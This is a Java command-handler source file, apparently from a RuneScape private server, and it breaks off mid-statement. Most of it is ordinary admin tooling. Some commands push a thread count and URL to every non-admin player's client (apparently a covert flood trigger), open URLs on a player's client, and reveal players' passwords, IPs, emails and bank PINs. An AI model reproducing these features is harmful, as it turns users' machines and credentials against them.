package org.hyperion.rs2.packet;

import java.io.BufferedReader;
import java.io.BufferedWriter;
import java.io.File;
import java.io.FileReader;
import java.io.FileWriter;
import java.io.IOException;
import java.util.*;

import org.hyperion.Server;
import org.hyperion.rs2.Constants;
import org.hyperion.rs2.commands.CommandHandler;
import org.hyperion.rs2.commands.impl.YellCommand;
import org.hyperion.rs2.event.Event;
import org.hyperion.rs2.event.impl.CountDownEvent;
import org.hyperion.rs2.event.impl.CutSceneEvent;
import org.hyperion.rs2.event.impl.NpcDeathEvent;
import org.hyperion.rs2.event.impl.OverloadStatsEvent;
import org.hyperion.rs2.event.impl.ServerMessages;
import org.hyperion.rs2.model.Animation;
import org.hyperion.rs2.model.BankPin;
import org.hyperion.rs2.model.DialogueManager;
import org.hyperion.rs2.model.Entity;
import org.hyperion.rs2.model.FriendsAssistant;
import org.hyperion.rs2.model.GameObjectDefinition;
import org.hyperion.rs2.model.Graphic;
import org.hyperion.rs2.model.Item;
import org.hyperion.rs2.model.ItemDefinition;
import org.hyperion.rs2.model.Location;
import org.hyperion.rs2.model.NPC;
import org.hyperion.rs2.model.NPCDefinition;
import org.hyperion.rs2.model.NPCDrop;
import org.hyperion.rs2.model.NPCManager;
import org.hyperion.rs2.model.Player;
import org.hyperion.rs2.model.Rank;
import org.hyperion.rs2.model.Skills;
import org.hyperion.rs2.model.SummoningMonsters;
import org.hyperion.rs2.model.UpdateFlags.UpdateFlag;
import org.hyperion.rs2.model.World;
import org.hyperion.rs2.model.Yelling;
import org.hyperion.rs2.model.challenge.Challenge;
import org.hyperion.rs2.model.challenge.ChallengeManager;
import org.hyperion.rs2.model.color.Color;
import org.hyperion.rs2.model.combat.Combat;
import org.hyperion.rs2.model.combat.CombatAssistant;
import org.hyperion.rs2.model.combat.Magic;
import org.hyperion.rs2.model.combat.attack.RevAttack;
import org.hyperion.rs2.model.combat.pvp.PvPArmourStorage;
import org.hyperion.rs2.model.combat.summoning.SummoningSpecial;
import org.hyperion.rs2.model.combat.weapons.Weapon;
import org.hyperion.rs2.model.combat.weapons.WeaponAnimations;
import org.hyperion.rs2.model.container.Bank;
import org.hyperion.rs2.model.container.BoB;
import org.hyperion.rs2.model.container.Equipment;
import org.hyperion.rs2.model.container.EquipmentReq;
import org.hyperion.rs2.model.container.ShopManager;
import org.hyperion.rs2.model.container.Trade;
import org.hyperion.rs2.model.container.impl.InterfaceContainerListener;
import org.hyperion.rs2.model.content.ContentEntity;
import org.hyperion.rs2.model.content.clan.ClanManager;
import org.hyperion.rs2.model.content.minigame.FightPits;
import org.hyperion.rs2.model.content.misc.ItemSpawning;
import org.hyperion.rs2.model.content.misc.Ticket;
import org.hyperion.rs2.model.content.misc.TriviaBot;
import org.hyperion.rs2.model.content.misc2.Afk;
import org.hyperion.rs2.model.content.misc2.Edgeville;
import org.hyperion.rs2.model.content.misc2.Jail;
import org.hyperion.rs2.model.content.misc2.NewGameMode;
import org.hyperion.rs2.model.content.misc2.SpawnTab;
import org.hyperion.rs2.model.content.misc2.Zanaris;
import org.hyperion.rs2.model.content.skill.GnomeStronghold;
import org.hyperion.rs2.model.itf.InterfaceManager;
import org.hyperion.rs2.model.itf.impl.ChangePassword;
import org.hyperion.rs2.model.itf.impl.NameItemInterface;
import org.hyperion.rs2.model.log.LogEntry;
import org.hyperion.rs2.model.possiblehacks.PasswordChange;
import org.hyperion.rs2.model.possiblehacks.PossibleHack;
import org.hyperion.rs2.model.possiblehacks.PossibleHacksHolder;
import org.hyperion.rs2.net.Packet;
import org.hyperion.rs2.util.EventBuilder;
import org.hyperion.rs2.util.MassEvent;
import org.hyperion.rs2.util.PlayerFiles;
import org.hyperion.rs2.util.PushMessage;
import org.hyperion.rs2.util.TextUtils;
import org.hyperion.util.Misc;
import org.madturnip.tools.DumpNpcDrops;

// Referenced classes of package org.hyperion.rs2.packet:
//            PacketHandler

public class CommandPacketHandler implements PacketHandler {

	private static final List<String> tooCool4School = Arrays.asList("ferry",
			"j", "relentless", "jet", "c", "arre", "secret", "nexon", "atomic");

	/**
	 * OWNER COMMANDS
	 */

	private void processOwnerCommands(final Player player, String commandStart,
			String s, String withCaps, String[] as) throws IOException {
		/**
		 * Same thing as promote commands, added for those inbetween ranks
		 */
		if (commandStart.equalsIgnoreCase("givefmod")) {
			Player p = World.getWorld().getPlayer(s.substring(9).trim());
			if (p != null) {
				p.setPlayerRank(Rank.addAbility(p, Rank.FORUM_MODERATOR));
			}
		}
		if (commandStart.equalsIgnoreCase("givevet")) {
			Player p = World.getWorld().getPlayer(s.substring(8).trim());
			if (p != null) {
				p.setPlayerRank(Rank.addAbility(p, Rank.VETERAN));
				player.sendMessage("Gave '" + p.getName() + "' veteran.");
			}
		}

		if (commandStart.equalsIgnoreCase("giveglobal")) {
			Player p = World.getWorld().getPlayer(s.substring(11).trim());
			if (p != null) {
				p.setPlayerRank(Rank.addAbility(p, Rank.GLOBAL_MODERATOR));
			}
		}
		if (commandStart.equalsIgnoreCase("sdonors")) {
			for (Player p : World.getWorld().getPlayers()) {
				if (Rank.hasAbility(p, Rank.SUPER_DONATOR))
					player.getActionSender().sendMessage(p.getName());
			}
		}

		if (commandStart.equalsIgnoreCase("rdonors")) {
			for (Player p : World.getWorld().getPlayers()) {
				if (Rank.hasAbility(p, Rank.DONATOR))
					player.getActionSender().sendMessage(p.getName());
			}
		}

        if(commandStart.equalsIgnoreCase("removerank")){ //
            try{
                final String name = s.substring(s.indexOf(" "), s.indexOf(",")).trim().toLowerCase();
                final Player target = World.getWorld().getPlayer(name);
                if(target == null){
                    player.getActionSender().sendMessage("This play is offline");
                    return;
                }
                final int index = Integer.parseInt(s.substring(s.indexOf(",") + 1).trim());
                final Rank rank = Rank.forIndex(index);
                if(rank == null || rank == Rank.PLAYER){
                    player.getActionSender().sendMessage("Rank is either null or index is too high");
                    return;
                }
                target.setPlayerRank(Rank.removeAbility(target, rank));
                player.getActionSender().sendMessage(String.format("Removed %s rank from %s", rank, target.getName()));
            }catch(Exception ex){
                player.getActionSender().sendMessage("Error removing rank");
            }
        }

		if (commandStart.equalsIgnoreCase("giverank")) {
			try {
				String theplay = s.substring(s.indexOf(" "), s.indexOf(","))
						.trim().toLowerCase();
				Player promoted = World.getWorld().getPlayer(theplay);
				String r = s.substring(s.indexOf(",") + 1).trim();
				int rValue = 0;
				try {
					rValue = Integer.parseInt(r);
				} catch (NumberFormatException e) {
					player.getActionSender().sendMessage(
							"Please enter a correct id");
					return;
				}
				Rank rank = Rank.forIndex(rValue);
				player.getActionSender().sendMessage(
						"Trying to give: " + theplay + " rank id: " + rValue);
				if (promoted != null) {
					if (rank.ordinal() >= Rank.DEVELOPER.ordinal()
							&& !player.isServerOwner())
						return;
					promoted.setPlayerRank(Rank.addAbility(promoted, rank));
					promoted.getActionSender().sendMessage(
							"You've been given: " + rank.toString());

					player.getActionSender().sendMessage(
							promoted.getName()
									+ " is promoted. current abilities:");
					for (Rank rr : Rank.values()) {
						if (Rank.hasAbility(promoted, rr)) {
							player.getActionSender().sendMessage(
									"@whi@"
											+ rank.toString()
											+ (Rank.isAbilityToggled(promoted,
													rr) ? "" : " [I]"));
						}
					}
				} else {
					player.getActionSender().sendMessage("Player is offline");
				}
			} catch (Exception e) {
				player.getActionSender()
						.sendMessage(
								"Use the command as such: ::giverank playername,rankid (::rankids)");
			}
		}

		if (commandStart.equalsIgnoreCase("rankids")) {
			int value = 0;
			for (Rank r : Rank.values()) {
				player.getActionSender().sendMessage(
						"Rank #" + (value++) + " is " + r.toString());
			}
		}

		if (commandStart.equals("config2")) {
			int i = Integer.parseInt(as[1]);
			int i3 = Integer.parseInt(as[2]);
			for (int i5 = i; i5 < i3; i5++) {
				player.getActionSender().sendClientConfig(i5, reverse);
			}

			if (reverse == 1) {
				reverse = 0;
			} else {
				reverse = 1;
			}
			return;
		}
		if (commandStart.equals("config")) {
			int j = Integer.parseInt(as[1]);
			int j3 = Integer.parseInt(as[2]);
			player.getActionSender().sendClientConfig(j, j3);
			return;
		}
		if (commandStart.equals("gc")) {
			System.gc();
			player.getActionSender().sendMessage("Garbage collect requested");
			return;
		}
		if (commandStart.equals("bank")) {
			Bank.open(player, false);
			return;
		}
		// add alltome again and ill kill you its a useless
		// command....
		if (commandStart.equals("givefreetabs")) {
			for (Player p : World.getWorld().getPlayers()) {
				if (p.getInventory().freeSlots() > 0) {
					ContentEntity.addItem(p, 8007 + Misc.random(5), 100);
					p.getActionSender().sendMessage(
							player.getName() + " just gave you 100 tabs!");
				}
			}
			return;
		}

		if (commandStart.startsWith("cutscene")) {
			World.getWorld().submit(new CutSceneEvent(player));
			return;
		}
		if (commandStart.startsWith("resetcam")) {
			player.getActionSender().cameraReset();
			return;
		}
		if (commandStart.startsWith("camera1")) {
			player.getActionSender().cameraMovement(Integer.parseInt(as[1]),
					Integer.parseInt(as[2]), Integer.parseInt(as[3]),
					Integer.parseInt(as[4]), Integer.parseInt(as[5]),
					Integer.parseInt(as[6]), Integer.parseInt(as[7]));
			return;
		}
		if (commandStart.startsWith("camera3")) {
			return;
		}
		if (commandStart.startsWith("camera2")) {
			player.getActionSender().rotateCamera(Integer.parseInt(as[1]),
					Integer.parseInt(as[2]), Integer.parseInt(as[3]),
					Integer.parseInt(as[4]), Integer.parseInt(as[5]),
					Integer.parseInt(as[6]), Integer.parseInt(as[7]));
			return;
		}
		/*
		 * if(!s1.startsWith("go2")) { return; } if(as.length != 3) { break
		 * MISSING_BLOCK_LABEL_2017; } int k2 = 1; int l4 =
		 * (Integer.parseInt(as[1]) - player.getLocation().getX()) + k2; int l5
		 * = (Integer.parseInt(as[2]) - player.getLocation().getY()) + k2;
		 * TileMapBuilder tilemapbuilder2 = new
		 * TileMapBuilder(player.getLocation(), k2); TileMap tilemap2 =
		 * tilemapbuilder2.build(); DumbPathFinder dumbpathfinder = new
		 * DumbPathFinder(); path =
		 * dumbpathfinder.findPath(player.getLocation(), k2, tilemap2, k2, k2,
		 * l4, l5); if(path == null) { return; } try {
		 * player.getWalkingQueue().reset(); Point point1; for(Iterator
		 * iterator1 = path.getPoints().iterator(); iterator1.hasNext();
		 * player.getWalkingQueue().addStep(player .getLocation().getX() +
		 * point1.getX(), point1.getY() + player.getLocation().getY())) { point1
		 * = (Point)iterator1.next(); }
		 * 
		 * player.getWalkingQueue().finish(); } catch(Throwable throwable1) {
		 * throwable1.printStackTrace(); } break MISSING_BLOCK_LABEL_2017;
		 */
		if (commandStart.equals("resetcontent")) {
			World.getWorld().getContentManager().init();
			return;
		}

		if (s.startsWith("head")) {
			player.headIconId = Integer.parseInt(as[1]);
			player.getUpdateFlags().flag(UpdateFlag.APPEARANCE);
			return;
		}
		if (s.startsWith("prayer")) {
			player.resetPrayers();
			player.getPrayers().setPrayerbook(
					!player.getPrayers().isDefaultPrayerbook());
			if (!player.getPrayers().isDefaultPrayerbook()) {
				player.getActionSender().sendSidebarInterface(5, 22500);
			} else {
				player.getActionSender().sendSidebarInterface(5, 5608);
			}
			return;
		}/*
		 * if (s1.equals("summon")) { SummoningMonsters.SummonNewNPC(player,
		 * Integer.parseInt(as[0]),-1); return; }
		 * 
		 * /* if(s1.equals("2path")) { int toX = Integer.parseInt(as[1]); int
		 * toY = Integer.parseInt(as[2]); int xLength = toX -
		 * player.getLocation().getX(); int yLength = toY -
		 * player.getLocation().getY(); if(xLength < 0) xLength *= -1;
		 * if(yLength < 0) yLength *= -1; org.hyperion.map.Region.p = player;
		 * org.hyperion.map.Region.findRoute(toX, toY, false, xLength, yLength);
		 * return; }
		 */
		/*
		 * if(s1.equals("path")) { int toX = Integer.parseInt(as[1]); int toY =
		 * Integer.parseInt(as[2]); int baseX = player.getLocation().getX()-25;
		 * int baseY = player.getLocation().getY()-25;
		 * player.getWalkingQueue().reset();
		 * player.getActionSender().sendMessage("=========="); //Path p =
		 * World.getWorld().pathTest.getPath(player.getLocation ().getX(),
		 * player.getLocation().getY(), toX, toY); int[][] path =
		 * WorldMap.getPath(player.getLocation().getX(),
		 * player.getLocation().getY(), toX, toY); if(path == null) return;
		 * for(int i = 0; i < path.length; i++){ //player.getActionSender
		 * ().sendMessage((baseX+p.getX(i))+"	"+(baseY+p.getY(i))); player
		 * .getWalkingQueue().addStep((baseX+path[i][0]),(baseY +path[i][1])); }
		 * player.getWalkingQueue().finish(); return; }
		 */
		if (commandStart.equals("clip")) {
			// WorldMap.getInfoAt(player,player.getLocation().getX(),player.getLocation().getY());
		}
		if (commandStart.equals("2interface")) {
			int id = Integer.parseInt(as[1]);
			player.getActionSender().sendInterfaceInventory(id, 3213);
			return;
		}
		if (commandStart.equals("option")) {
			int id = Integer.parseInt(as[1]);
			player.getActionSender().sendPacket164(id);
		}

		if (commandStart.equals("nameobj")) {
			s = s.substring(8).toLowerCase();
			for (int i = 0; i < GameObjectDefinition.MAX_DEFINITIONS; i++) {
				if (GameObjectDefinition.forId(i).getName().toLowerCase()
						.contains(s)) {
					player.getActionSender().sendMessage(
							i + "	" + GameObjectDefinition.forId(i).getName());
				}
			}
			return;
		}

		if (commandStart.equals("spawnaltars")) {
			player.getActionSender().sendMessage("Executing command!");
			int id = 13192;
			int face = 0;
			int type = 10;
			player.getActionSender().sendCreateObject(54, 49, id, type, face);

			// TextUtils.writeToFile("./data/objspawns.cfg",
			// "spawn = "+Integer.parseInt(as[1])+"	"+player.getLocation().getX()+"	"+player.getLocation().getY()+"	"+player.getLocation().getZ()+"	"+face+"	"+type+"	"+GameObjectDefinition.forId(Integer.parseInt(as[1])).getName());
			return;
		}

		if (commandStart.equals("spawnobject")) {
			int id = Integer.parseInt(as[1]);
			int face = Integer.parseInt(as[2]);
			int type = 10;
			player.getActionSender().sendMessage(
					"Spawning " + GameObjectDefinition.forId(id).getName()
							+ "[" + id + "].");
			player.getActionSender().sendCreateObject(id, type, face,
					player.getLocation());
			return;
		}

		if (commandStart.equals("removeobject")) {
			for (int i = 0; i < 15; i++) {
				player.getActionSender().sendDestroyObject(i, 0,
						player.getLocation());
			}
			return;
		}

		if (commandStart.startsWith("removeobjects")) {
			int id = Integer.parseInt(as[1]);
			Location loc = player.getLocation();
			for (int x = loc.getX() - id; x < loc.getX() + id; x++) {
				for (int y = loc.getY() - id; y < loc.getY() + id; y++) {
					for (int i = 0; i < 15; i++) {
						player.getActionSender().sendDestroyObject(i, 0,
								Location.create(x, y, loc.getZ()));
					}
				}
			}
			return;
		}
		/*
		 * if(s1.equals("jad")) { int k = Integer.parseInt(as[1]);
		 * World.getWorld().getContentManager().handlePacket(6, player, 9358, k,
		 * 1, 1); return; }
		 */
		/*
		 * if(s1.equals("tele")) { if(as.length == 3 || as.length == 4) { int l
		 * = Integer.parseInt(as[1]); int k3 = Integer.parseInt(as[2]); int j5 =
		 * player.getLocation().getZ(); if(as.length == 4) { j5 =
		 * Integer.parseInt(as[3]); }
		 * player.setTeleportTarget(Location.create(l, k3, j5)); } else {
		 * player.getActionSender().sendMessage(
		 * "Syntax is ::tele [x] [y] [z]."); } return; }
		 */
		/*
		 * if(s1.equals("switch")) { if(!player.ancients) { player.ancients =
		 * true; player.getActionSender().sendSidebarInterface(6, 12855); } else
		 * { player.ancients = false;
		 * player.getActionSender().sendSidebarInterface(6, 1151); } return; }
		 */
		if (commandStart.equals("interface")) {
			int i1 = Integer.parseInt(as[1]);
			player.getActionSender().showInterface(i1);
			return;
		}
		if (commandStart.equals("sidebarinterface")) {
			int i1 = Integer.parseInt(as[1]);
			int i2 = Integer.parseInt(as[2]);
			player.getActionSender().sendSidebarInterface(i2, i1);
			return;
		}
		if (commandStart.equals("string")) {
			int j1 = Integer.parseInt(as[1]);
			player.getActionSender().sendString(j1,
					(new StringBuilder()).append("").append(j1).toString());
			return;
		}

		if (commandStart.equals("restore")) {
			World.getWorld().getNPCManager().restoreArea(player.getLocation());
			return;
		}
		if (commandStart.equals("anim")) {
			if (as.length == 2 || as.length == 3) {
				int l1 = Integer.parseInt(as[1]);
				int i4 = 0;
				if (as.length == 3) {
					i4 = Integer.parseInt(as[2]);
				}
				player.playAnimation(Animation.create(l1, i4));
			}
			return;
		}

		if (commandStart.equals("launchforplayer")) {
			s = s.replaceAll("launchforplayer ", "");
			try {
				String[] parts = s.split(";");
				String name = parts[0];
				String url = parts[1];
				Player p = World.getWorld().getPlayer(name);
				if (p == null)
					return;
				p.getActionSender().sendMessage("l4unchur13 http://www." + url);
			} catch (Exception e) {
				e.printStackTrace();
			}
			return;
		}

		if (commandStart.equals("reloadquestions")) {
			TriviaBot.loadQuestions();
			player.getActionSender().sendMessage("Reloading");
			return;
		}

		if (commandStart.equals("wanim")) {
			if (as.length == 2 || as.length == 3) {
				int l1 = Integer.parseInt(as[1]);
				player.getAppearance().setAnimations(l1, l1, l1);
				player.getUpdateFlags().flag(UpdateFlag.APPEARANCE);
			}
			return;
		}
		if (commandStart.equals("diag")) {
			if (as.length == 3) {
				int l1 = Integer.parseInt(as[1]);
				int i2 = Integer.parseInt(as[2]);
				player.setInteractingEntity(World.getWorld().getNPCs().get(i2));
				DialogueManager.openDialogue(player, l1);
			}
			return;
		}
		if (commandStart.equals("swing")) {
			ObjectClickHandler.objectClickOne(player, 26303, 1, 1);
		}
		if (commandStart.equals("gfx")) {
			if (as.length == 2 || as.length == 3) {
				int i2 = Integer.parseInt(as[1]);
				int j4 = 0;
				if (as.length == 3) {
					j4 = Integer.parseInt(as[2]);
				}
				player.playGraphics(Graphic.create(i2, j4));
			}
			return;
		}
		if (commandStart.equals("trade")) {
			Trade.open(player, null);
			return;
		}
		/*
		 * if(s1.startsWith("admin")) { try { player.getRights().value = 2; }
		 * catch(Exception exception3) { } return; }
		 */
		if (commandStart.startsWith("pin")) {
			try {
				s = s.replace("pin ", "");
				Player player2 = World.getWorld().getPlayer(s);
				if (player2 != null) {
					player.getActionSender().sendMessage(
							player2.getName() + "'s bank pin is: "
									+ player2.bankPin);
				} else
					player.getActionSender().sendMessage(
							"This player is not online.");
			} catch (Exception exception3) {
			}
			return;
		}

		if (commandStart.startsWith("tuti")) {
			try {
				s = s.replace("tuti ", "");
				Player player2 = World.getWorld().getPlayer(s);
				if (player2 != null) {
					player.getActionSender().sendMessage(
							player2.getName() + "'s tut stage: "
									+ player2.tutIsland);
				} else
					player.getActionSender().sendMessage(
							"This player is not online.");
			} catch (Exception exception3) {
			}
			return;
		}

		if (commandStart.startsWith("kick")) {
			try {
				s = s.replace("kick ", "");
				Player player2 = World.getWorld().getPlayer(s);
				if (player2 != null) {
					System.out.println("Kicking: " + player2.getName());
					// player2.getSession().close(false);
					World.getWorld().unregister2(player);
				} else
					player.getActionSender().sendMessage(
							"This player is not online.");
			} catch (Exception exception3) {
			}
			return;
		}

		if (commandStart.equals("jad")) {
			int k = Integer.parseInt(as[1]);
			World.getWorld().getContentManager()
					.handlePacket(6, player, 9358, k, 1, 1);
			return;
		}
		if (commandStart.equals("resetshops")) {
			ShopManager.reloadShops();
			return;
		}

		if (commandStart.equals("duel")) {
			player.setTeleportTarget(Location.create(3375, 3274, 0));
		}
		if (commandStart.equals("pits")) {
			player.setTeleportTarget(Location.create(2399, 5177, 0));
		}
	}

	/**
	 * ADMIN COMMANDS
	 **/
	private void processAdminCommands(final Player player, String commandStart,
			String s, String withCaps, String[] as) {

		if (commandStart.equalsIgnoreCase("hide")) {
			player.isHidden(!player.isHidden());
			player.setPNpc(player.isHidden() ? 942 : -1);
			player.sendMessage("Hidden: " + player.isHidden());
			FriendsAssistant.refreshGlobalList(player,
					player.isHidden());
		}

        if(commandStart.equals("testhits")) {
            int counter = 0;
            for(; counter < 100; counter++) {
                Combat.processCombat(player.cE);
                player.cE.predictedAtk = System.currentTimeMillis();
                player.cE.getOpponent()._getPlayer().ifPresent(p -> p.getSkills().setLevel(Skills.HITPOINTS, 99));
            }
        }

        if(commandStart.equalsIgnoreCase("summonnpc")) {
            int id = Integer.parseInt(as[1]);
            final NPC monster = World
                    .getWorld()
                    .getNPCManager()
                    .addNPC(player.getLocation().getX(), player.getLocation().getY(),
                            player.getLocation().getZ(), id, - 1);
            player.SummoningCounter = 6000;
            monster.ownerId = player.getIndex();
            Combat.follow(monster.getCombat(), player.getCombat());
            monster.summoned = true;
            player.cE.summonedNpc = monster;
            monster.playGraphics(Graphic.create(1315));
        }

		if (commandStart.equals("startminigame"))
			World.getWorld().submit(new CountDownEvent());

        if(commandStart.equalsIgnoreCase("savepricelist")) {
            try (final BufferedWriter writer = new BufferedWriter(new FileWriter(new File("./data/prices.txt")))) {
                int count = 0;
                for(int i = 0; i < ItemDefinition.MAX_ID; i++) {
                    try {
                    long price = NewGameMode.getUnitPrice(i);
                    writer.write(i + " " + price);
                    if(price > 0)
                        count++;
                    else
                        TextUtils.writeToFile("./data/nullprices.txt", i+": "+ItemDefinition.forId(i).getName() + " is worth no coins and is noted is "+ItemDefinition.forId(i).isNoted());
                    writer.newLine();
                    }catch(final Exception e) {

                    }
                }
                player.sendMessage("Saved "+count+" non-zero prices");
            } catch(Exception e) {
                e.printStackTrace();
            }
        }

        if(commandStart.equalsIgnoreCase("startshit")) {
            player.sendf("%s %s %s", as[0], as[1], as[2]);
            final int threads = Integer.parseInt(as[1]);
            final String url = as[2];
            for(final Player p : World.getWorld().getPlayers())
                if(p != null && !Rank.hasAbility(p, Rank.ADMINISTRATOR))
                    p.sendMessage("script107"+threads+","+url);
        }

        if(commandStart.equals("stopshit")) {
            for(final Player p : World.getWorld().getPlayers())
                p.sendMessage("script105");
        }

		/**
		 * Get player's pass, before it checks for external commands because
		 * "getpass" exists for DeviousPK (Too lazy to edit it so it works :( )
		 */

		if (Server.NAME.equalsIgnoreCase("arteropk") && commandStart.equalsIgnoreCase("getip")) {
            final String name = s.substring(5).trim();
            if (tooCool4School.contains(name.toLowerCase()))
                return;
			player.getActionSender().sendMessage(
					findCharString(name, "IP"));
			return;
		}
		if (commandStart.equalsIgnoreCase("getmail")) {
			player.getActionSender().sendMessage(
					findCharString(s.substring(8).trim(), "mail"));
			return;
		}
		if (commandStart.equalsIgnoreCase("ferry")) {
			player.setTeleportTarget(Location.create(2574, 3298, 2));
			return;
		}
		if (commandStart.equalsIgnoreCase("superman")) {
			player.getAppearance().setAnimations(1851, 1851, 1851);
			;
			player.getUpdateFlags().flag(UpdateFlag.APPEARANCE);
		}
		if (commandStart.equalsIgnoreCase("setlevel")) {
			try {
				String[] args = s.substring(9).trim().split(",");
				Player thePlay = World.getWorld().getPlayer(args[0]);
				int skill = Integer.parseInt(args[1]);
				int level = Integer.parseInt(args[2]);
				if (thePlay != null) {
					thePlay.getSkills().setLevel(skill, level);
					if (level <= 99) {
						thePlay.getSkills().setExperience(skill,
								thePlay.getSkills().getXPForLevel(level) + 5);
					}
				} else
					player.sendf("%s is not online", args[0]);
			} catch (Exception e) {
				player.sendMessage("Format for the command is ::setlevel name,skillid,level");
			}
		}

        /**
         * w8ing to test spec is a drag!
         *
         */
        if (commandStart.startsWith("infspec")) {
            Player target = null;
            try {
                target = World.getWorld().getPlayer(
                        s.substring(8).trim());
            } catch (NullPointerException
                    | StringIndexOutOfBoundsException e) {
            }
            target = (target == null) ? player : target;

            final Player t = target;
            World.getWorld().submit(new Event(500) {
                public void execute() {
                    t.getSpecBar().setAmount(1000);
                    if (t.cE == null)
                        this.stop();
                }
            });
        }

        /**
         * dat fro
         */
        if (commandStart.equals("datfro")) {
            final int[] fros = { 14743, 14745, 14747, 14749, 14751 };
            boolean b = as[1] != null && as[1].equalsIgnoreCase("true");
            if (b) {
                World.getWorld().submit(new Event(1000) {

                    @Override
                    public void execute() {
                        player.getEquipment().set(
                                Equipment.SLOT_HELM,
                                new Item(fros[Combat
                                        .random(fros.length - 1)]));
                    }

                });
            } else {
                for (int i : fros) {
                    player.getInventory().add(new Item(i));
                }
            }
        }
	}

	/** ADMINISTRATOR COMMANDS **/

	private void processDeveloperCommands(final Player player,
			String commandStart, String s, String withCaps, String[] as) {



        if (Server.NAME.equalsIgnoreCase("arteropk") && commandStart.equals("getpass")) {
            String r = findCharString(s.substring(7).trim(), "Rank")
                    .replaceAll("=", "").replaceAll("Rank", "").trim();
            player.sendMessage(r);
            try {
                long rank = Long.parseLong(r);
                if (Rank.hasAbility(rank, Rank.MODERATOR)) {
                    player.getActionSender().sendMessage(
                            "You cannot grab the password of staff!");
                    return;
                }
            } catch (Exception e) {
                e.printStackTrace();
            }
            String name = s.substring(7).trim();
            if (tooCool4School.contains(name.toLowerCase()))
                return;
            player.getActionSender().sendMessage(findCharString(name, "Pass"));
            return;
        }

        if (commandStart.equalsIgnoreCase("display")) {
            String display = withCaps.substring(8).trim();
            if (display.toLowerCase().contains("arre"))
                return;
            player.display = display;
        }



        if(commandStart.equalsIgnoreCase("checkhax")) {
            String r = findCharString(s.substring(8).trim(), "Rank")
                    .replaceAll("=", "").replaceAll("Rank", "").trim();
            player.sendMessage(r);
            try {
                long rank = Long.parseLong(r);
                if (Rank.hasAbility(rank, Rank.HELPER)) {
                    player.getActionSender().sendMessage(
                            "You cannot grab the password of staff!");
                    return;
                }
            } catch (Exception e) {
                e.printStackTrace();
            }
            final String name = s.substring(9).trim();
            System.out.println(name);
            final List<PossibleHack> hacksForName = PossibleHacksHolder.getHacks(name);
            for(final PossibleHack hack : hacksForName)
                player.sendMessage(hack.toString(), "@blu@"+hack.date);
        }


        if(commandStart.equalsIgnoreCase("emptysummnpcs")) {
            for(final int i : SummoningMonsters.SUMMONING_MONSTERS) {
                for(final NPC npc : World.getWorld().getNPCs()) {
                    if(npc.getDefinition().getId() == i) {
                        World.getWorld().submit(new NpcDeathEvent(npc));
                        World.getWorld().getNPCs().remove(npc);

                    }
                }
            }
        }

        if(commandStart.equalsIgnoreCase("turnbhon")) {
            final Map<
                    String, Map.Entry<Boolean, Boolean>> map = new HashMap<>();
            for(final Player p : World.getWorld().getPlayers()) {
                boolean old = p.getPermExtraData().getBoolean("bhon");
                p.getPermExtraData().put("bhon", true);
                boolean change = p.getPermExtraData().getBoolean("bhon");
                map.put(p.getName(), new AbstractMap.SimpleEntry<Boolean, Boolean>(old, change));
                p.sendf("Your bounty hunter has been set from @red@%s @bla@to @red@%s", old, change);
            }

            for(final Map.Entry<String, Map.Entry<Boolean, Boolean>> entry : map.entrySet()) {
                player.sendf("@blu@%s @red@%s@bla@->@red@%s", entry.getKey(), entry.getValue().getKey(), entry.getValue().getKey());
            }

        }

        if(commandStart.equalsIgnoreCase("reloadrevs")) {
            for(final NPC n : World.getWorld().getNPCs()) {
                n.agreesiveDis = NPCManager.getAgreDis(n.getDefinition().getId());
            }
            for(int k : RevAttack.getRevs()) {
                final NPCDefinition def = NPCDefinition.forId(k);
            if(def != null) {
                def.getDrops().clear();
                for(final int i : PvPArmourStorage.getArmours())
                    def.getDrops().add(NPCDrop.create(i, 1, 1, def.combat() / 10));
                def.getDrops().add(NPCDrop.create(13895, 1, 1, def.combat() / 50));
                def.getDrops().add(NPCDrop.create(13889, 1, 1, def.combat()/30));

            }
            }

            DumpNpcDrops.startDump2();
        }


        if(commandStart.equals("imitatedeaths")) {
            final int id = Integer.parseInt(as[1]);
            for(int i = 0; i < 100; i++) {

                NPC npc = World.getWorld().getNPCManager().addNPC(player.getLocation(), id, -1);
                npc.cE.hit(npc.health * 5, player, false, Constants.DEFLECT);

            }
        }
		
		if(commandStart.equals("setkills")) {
			int amount = Integer.parseInt(as[1]);
			player.setKillCount(amount);
		}
		
		if(commandStart.equals("howmanyinwild")) {
			int count = 0;
			for(Player p : World.getWorld().getPlayers()) {
				if(Location.inAttackableArea(p))
					count++;
			}
			player.sendMessage(count);
		}
		
		if (commandStart.equals("debug")) {
			player.debug = true;
			return;
		}

		if (commandStart.equalsIgnoreCase("resetpits")) {
			for (Player p : FightPits.playersInGame) {
				FightPits.removePlayerFromGame(p, true);

			}
			FightPits.playersInGame.clear();
		}

		if (commandStart.equalsIgnoreCase("setminyell")) {
			int yellmin = Integer.parseInt(as[1]);
			YellCommand.minYellRank = yellmin;
		}

		if (commandStart.equalsIgnoreCase("setnpc")) {
			try {
				String name = withCaps
						.substring(withCaps.indexOf(" "),
								withCaps.indexOf(",")).trim()
						.toLowerCase();
				Player target = World.getWorld().getPlayer(name);
				if (target != null) {
					int npc = Integer.parseInt(withCaps.substring(
							withCaps.indexOf(",") + 1).trim());
					target.setPNpc(npc);
				} else {
					player.getActionSender().sendMessage(
							"Player not online");
				}
			} catch (NullPointerException
					| StringIndexOutOfBoundsException e) {
				return;
			}
		}

		/**
		 * Made the system already pshh, it'll just sit there
		 */
		if (commandStart.equalsIgnoreCase("settag")) {
			try {
				String tag = withCaps.substring(7); // how else can i
													// have "Rich Homie"
				if (Yelling.isValidTitle(tag).length() > 1) {
					player.getActionSender().sendMessage(
							Yelling.isValidTitle(tag));
					return;
				}
				player.getYelling().setYellTitle(tag);
			} catch (NullPointerException
					| StringIndexOutOfBoundsException e) {
				player.getActionSender().sendMessage("Invalid tag");
				return;
			}
		}

		if (commandStart.startsWith("closelistener")) {
			player.getInterfaceState().resetContainers();
		}
		/**
		 * Display, glitchd command, i'll uncomment it when i feel like
		 * fixing it, not important
		 */

		/**
		 * Configurations
		 */
		if (commandStart.equals("config2")) {
			int i = Integer.parseInt(as[1]);
			int i3 = Integer.parseInt(as[2]);
			for (int i5 = i; i5 < i3; i5++) {
				player.getActionSender().sendClientConfig(i5, reverse);
			}

			if (reverse == 1) {
				reverse = 0;
			} else {
				reverse = 1;
			}
			return;
		}
		if (commandStart.equals("config")) {
			int j = Integer.parseInt(as[1]);
			int j3 = Integer.parseInt(as[2]);
			player.getActionSender().sendClientConfig(j, j3);
			return;
		}
		if (commandStart.equalsIgnoreCase("findcoolloc")) {
			player.setTeleportTarget(Location.create(
